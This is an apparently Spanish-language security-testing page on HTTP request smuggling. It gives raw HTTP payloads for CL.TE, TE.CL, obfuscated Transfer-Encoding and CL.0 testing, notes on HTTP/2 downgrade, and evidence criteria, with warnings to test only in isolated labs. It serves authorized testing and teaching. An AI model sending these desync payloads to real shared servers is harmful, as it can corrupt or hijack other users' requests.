# 🗡️ HTTP Request Smuggling: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. CL.TE en laboratorio aislado

**Objetivo:** Frontend usa Content-Length y backend Transfer-Encoding.

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Interpretación:** Enviar bytes CRLF exactos con actualización automática de longitud desactivada. Jamás probar en conexión compartida sin autorización específica.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling).

### 2. TE.CL en laboratorio aislado

**Objetivo:** Frontend usa Transfer-Encoding y backend Content-Length.

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**Interpretación:** El resultado depende del parser y bytes exactos; una respuesta anómala no prueba desync.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling).

### 3. TE obfuscado

**Objetivo:** Comprobar discrepancia por normalización de cabecera en laboratorio.

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 13
Transfer-Encoding : chunked

0

SMUGGLED
```

**Interpretación:** El espacio antes de `:` debería rechazarse; comparar parsers y no afectar otras sesiones.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling).

### 4. Control sin ambigüedad

**Objetivo:** Descartar pipelining o simple reuse de conexión.

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 0
Connection: close
```

**Interpretación:** Un control normal debe mantener fronteras de request. Revisar investigación de falsos positivos.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling).

### 5. H2 downgrade

**Objetivo:** Observar conversión de HTTP/2 a HTTP/1.1 en un lab controlado.

```text
Burp Repeater → HTTP/2 → modificar una cabecera inyectada que el frontend convierta a HTTP/1.1.
```

**Interpretación:** No existe payload universal: registrar bytes de la traducción y demostrar desync solo en laboratorio.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/request-smuggling/advanced).

### 6. CL.0

**Objetivo:** Comparar si backend ignora un cuerpo declarado.

```text
Burp Repeater en laboratorio: POST con Content-Length y cuerpo inocuo; segunda request propia en misma conexión.
```

**Interpretación:** Necesita prueba de desincronización de solicitudes propias; un 400 o timeout aislado no basta.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/request-smuggling/browser/cl-0).

### 7. Cierre de conexión como mitigación observable

**Objetivo:** Registrar si frontend cierra ante framing ambiguo.

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 0
Transfer-Encoding: chunked
```

**Interpretación:** El rechazo y cierre son esperables; no inferir vulnerabilidad si se tolera la cabecera pero no hay desync.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/request-smuggling).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
